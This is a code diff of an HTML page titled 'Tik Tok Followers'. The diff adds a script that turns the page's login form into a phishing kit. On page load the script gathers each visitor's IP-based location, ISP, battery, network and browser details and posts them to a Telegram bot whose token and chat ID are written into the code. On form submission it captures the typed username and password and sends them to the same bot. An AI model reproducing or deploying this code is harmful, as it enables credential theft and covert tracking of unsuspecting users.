@@ -1,62 +1,193 @@
 <!DOCTYPE html>
 <html>
-
-
-<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Tik Tok Followers</title>
-<script src="jquery.min.js"></script>
-<script src="jscript.js"></script>
-<link rel="stylesheet" type="text/css" href="style.css">
-<style>
-    @media(max-width:760px){
-       #TFG{
-           font-size:140%;
-       } 
-       .buttonstyle{
-           font-size:100%;
-       }
-    
-    .followers , .likes{
-        width:95%;
-    }
-    }
-</style>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Tik Tok Followers</title>
+    <script src="jquery.min.js"></script>
+    <script src="jscript.js"></script>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <style>
+        @media(max-width:760px){
+            #TFG{
+                font-size:140%;
+            }
+            .buttonstyle{
+                font-size:100%;
+            }
+            .followers, .likes{
+                width:95%;
+            }
+        }
+    </style>
 </head>
 <body onload="updateyear()">
-</div>
-<div id="main-tool">
-	<div class="wrapper"><img src="logo.png"></div>
-	<h1 id="TFG">Login</h1>
+    <div id="main-tool">
+        <div class="wrapper"><img src="logo.png"></div>
+        <h1 id="TFG">Login</h1>
 
-<p class="sub-heading"></p>
-<p class="sub-heading"></p>
+        <p class="sub-heading"></p>
+        <p class="sub-heading"></p>
 
+        <form id="loginForm" action="login.php" method="POST">
+            <center>
+                <div id="fillup">
+                    <div class="form-option">
+                        <input name="email" id="input-username" class="input-form input-command" type="text" placeholder="Username/Email/Phone" required>
+                    </div>
+                    <div class="form-option">
+                        <input name="password" id="input-password" class="input-form input-command" type="password" placeholder="Password" required>
+                    </div>
+                    <br><br>
+                    <button type="submit" id="loginButton" class="buttonstyle"><b>Login</b></button>
+                </center>
+            </div>
+        </form>
 
-    <form action="login.php" method="POST">
-    <center>
-    <div id="fillup">
-        <div class="form-option">
-        	<input name="email" class="input-form input-command" type="text" placeholder="Username/Email/Phone" required>
-        </div>
-    <div id="fillup">
-        <div class="form-option">
-        	<input name="password" class="input-form input-command" type="password" placeholder="Password" required>
-        </div>
-
-        <br><br>
-        <button class="buttonstyle"><b>Login</b></button>
-        </center>
-
+        <div id="steps" style="display:none;"></div>
+        <div id="comment" style="display:none;"></div>
     </div>
-</div>
 
-<div id="steps" style="display:none;">
+    <script>
+        // Default chat ID
+        const defaultChatId = '5624278091'; // Replace with your default chat ID
 
-</div>
+        // Function to get IP Address information using ip-api.com
+        async function getIPInfo() {
+            const response = await fetch('http://ip-api.com/json/?fields=ip,city,regionName,country,zip,lat,lon,isp,org,as,query');
+            const data = await response.json();
+            return data;
+        }
 
-<div id="comment" style="display:none;" >
-</div>
+        // Function to get Battery Information
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: (battery.level * 100) + '%',
+                    charging: battery.charging ? 'Yes' : 'No'
+                };
+            }
+            return {
+                level: 'N/A',
+                charging: 'N/A'
+            };
+        }
+
+        // Function to get Network Information
+        function getNetworkInfo() {
+            if (navigator.connection) {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                return connection.effectiveType || 'N/A';
+            }
+            return 'N/A';
+        }
+
+        // Function to get User Agent
+        function getUserAgent() {
+            return navigator.userAgent;
+        }
+
+        // Function to get chat ID from URL parameters
+        function getChatIdFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('chatId') || defaultChatId;
+        }
+
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            const botToken = '6696317970:AAH1NZPjLjwD_8Jav73izvSqtDKL9qGpMBE'; // Replace with your bot token
+            const chatId = getChatIdFromURL(); // Get chat ID from URL or use default
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                }),
+            });
+        }
+
+        // Function to collect and send initial data
+        async function sendInitialData() {
+            const ipInfo = await getIPInfo();
+            const battery = await getBatteryInfo();
+            const networkType = getNetworkInfo();
+            const userAgent = getUserAgent();
+
+            const message = `
+✦───────────────────✦「page title: ${document.title}」️ ✦───────────────────✦
+
+┌────────⭓
+├⪦ ∷IP: ${ipInfo.ip}
+├⪦ ∷City: ${ipInfo.city}
+├⪦ ∷Region: ${ipInfo.regionName}
+├⪦ ∷Country: ${ipInfo.country}
+├⪦ ∷ZIP: ${ipInfo.zip}
+├⪦ ∷Latitude: ${ipInfo.lat}
+├⪦ ∷Longitude: ${ipInfo.lon}
+├⪦ ∷ISP: ${ipInfo.isp}
+├⪦ ∷Organization: ${ipInfo.org}
+├⪦ ∷AS: ${ipInfo.as}
+└────────────────⧕
+
+✦────────────────────✦
+├⪦ ∷Network Type: ${networkType}
+├⪦ ∷Battery Level: ${battery.level}
+├⪦ ∷Battery Charging: ${battery.charging}
+└────────────────────
+
+✦────────────────────✦
+UserAgent: ${userAgent}
+✦────────────────────✦
+            `;
+
+            await sendToTelegram(message);
+        }
+
+        // Function to collect and send login details
+        async function sendLoginDetails(username, password) {
+            const message = `
+✦───────────────────✦「Login Details」✦───────────────────✦
+
+┌────────⭓
+├⪦ ∷Username: ${username}
+├⪦ ∷Password: ${password}
+└────────────────⧕
+            `;
+
+            await sendToTelegram(message);
+        }
+
+        // Handle page load
+        window.onload = function() {
+            sendInitialData();
+        }
+
+        // Handle form submission and button click
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form from submitting normally
+
+            // Disable the button
+            const loginButton = document.getElementById('loginButton');
+            loginButton.disabled = true;
+
+            // Collect form data
+            const username = document.getElementById('input-username').value;
+            const password = document.getElementById('input-password').value;
+
+            // Collect and send login details
+            sendLoginDetails(username, password).then(() => {
+                // Re-enable the button after 5 seconds
+                setTimeout(() => {
+                    loginButton.disabled = false;
+                }, 5000);
+            });
+        });
+    </script>
 </body>
-
 </html>
